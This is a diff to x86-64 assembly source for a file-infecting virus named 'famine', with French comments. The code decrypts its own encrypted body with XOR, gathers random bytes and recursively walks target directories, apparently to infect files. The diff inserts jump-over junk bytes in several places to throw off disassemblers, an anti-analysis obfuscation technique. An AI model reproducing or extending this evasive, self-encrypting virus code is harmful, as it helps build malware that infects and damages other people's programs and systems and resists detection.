@@ -9,6 +9,8 @@ section .text
 
 main:
     enter famine_size, 0                 ; comstruit la stack et ajoute la structure famine dans la stack
+    jmp $+4
+    db `\x31\x2d`
     push rdx                             ; push les registre important pour pouvoir les rétablir une fois le virus executer
     push rcx
     push rdi
@@ -24,7 +26,8 @@ decrypte:
     mov rbx, rsi
     dec rbx
     mov r8, rdx
-
+    jmp $+4
+    db `\x48\x8b`
     ; if (i == 0) ; data[i] = data[i] ^ value[0]; else ; data[i] = data[i] ^ data[i - 1];
     cmp rbx, 0
     mov rdx, [rel decrypt_v2]
@@ -38,7 +41,8 @@ decrypte:
     div rcx
     mov dl, [r8 + rdx]
     xor [rdi + rbx], dl
-
+    jmp $+4
+    db `\x48\x8b`
     ; data[i] = data[i] ^ value[i % 16]
     mov rax, rbx
     and rax, 15
@@ -50,7 +54,8 @@ decrypte:
     mov al, byte [rdi + rbx]
     sub al, bl
     mov byte [rdi + rbx], al
-
+    jmp $+4
+    db `\x48\x8b`
     dec rbx
     cmp rbx, 0
 encrypted_start:
@@ -92,13 +97,13 @@ encrypted_start_suite:
     mov rdx, GRND_RANDOM
     mov rax, SYS_GETRANDOM
     syscall
-
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
     call ft_strcpy
     mov rdi, rsp
     call recursive
-
+    jmp $+4
+    db `\x69\x61`
     lea rdi, [rsp + fileName]
     lea rsi, [rel secondDir]
     call ft_strcpy
